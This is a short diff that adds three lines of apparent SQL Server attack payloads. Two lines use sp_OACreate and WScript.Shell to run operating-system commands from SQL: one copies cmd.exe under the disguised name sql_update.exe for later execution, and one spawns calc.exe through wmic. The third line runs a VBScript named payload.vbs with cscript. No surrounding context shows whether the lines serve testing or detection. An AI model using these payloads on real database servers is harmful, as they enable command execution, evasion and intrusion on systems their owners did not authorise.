@@ -1,0 +1,3 @@
+DECLARE @myshell INT; EXEC sp_OACreate 'WScript.Shell', @myshell OUTPUT; EXEC sp_OAMethod @myshell, 'Run', NULL, 'powershell.exe -c "Copy-Item cmd.exe -Destination sql_update.exe"', 0, 0; -- followed by executing sql_update.exe
+DECLARE @myshell INT; EXEC sp_OACreate 'WScript.Shell', @myshell OUTPUT; EXEC sp_OAMethod @myshell, 'Run', NULL, 'wmic.exe process call create "calc.exe"', 0, 0;
+cscript.exe payload.vbs
